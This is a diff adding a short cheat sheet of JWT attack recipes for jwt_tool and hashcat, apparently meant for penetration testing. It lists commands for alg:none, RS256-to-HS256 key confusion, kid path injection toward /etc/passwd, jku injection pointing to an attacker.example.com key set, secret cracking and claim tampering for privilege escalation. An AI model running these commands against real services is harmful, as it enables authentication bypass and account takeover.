@@ -1,0 +1,39 @@
+# JWT attack recipes. Use jwt_tool or flask-unsign/mitmproxy-jwt for automation.
+
+## TOOL
+# jwt_tool: https://github.com/ticarpi/jwt_tool
+
+## ALG_NONE
+# Accept "alg":"none" and empty signature.
+jwt_tool <token> -X a
+
+## KEY_CONFUSION_RS256_TO_HS256
+# Server verifies with public key; attacker re-signs token with HS256 using the public key as HMAC secret.
+jwt_tool <token> -X k -pk public.pem
+
+## KID_INJECTION
+# kid header is used as a file path / SQL lookup — point it elsewhere.
+jwt_tool <token> -I -hc kid -hv "../../dev/null" -X s
+jwt_tool <token> -I -hc kid -hv "/etc/passwd" -X s
+
+## JKU_JWK_INJECTION
+# Attacker-controlled key via jku/jwk header.
+jwt_tool <token> -X i -I -hc jku -hv "https://attacker.example.com/jwks.json"
+
+## WEAK_HMAC_SECRET
+# Crack HS256 secrets with wordlist.
+jwt_tool <token> -C -d /path/to/jwt.secrets.list
+hashcat -m 16500 token.txt /path/to/wordlist
+
+## CLAIM_TAMPERING
+# Privilege escalation by mutating claims; requires weak/absent signature check.
+jwt_tool <token> -T
+# Typical targets: role, admin, user_id, scope, iss, aud
+
+## EXPIRED_TOKEN_ACCEPTANCE
+# Servers that don't validate exp/nbf/iat.
+# Manually set exp to past, submit, expect 401; if accepted => finding.
+
+## CONFUSED_DEPUTY
+# None of the JWT-layer flaws — but the token is trusted as an identity assertion downstream.
+# Check: does a resource server accept a token signed by a different issuer?
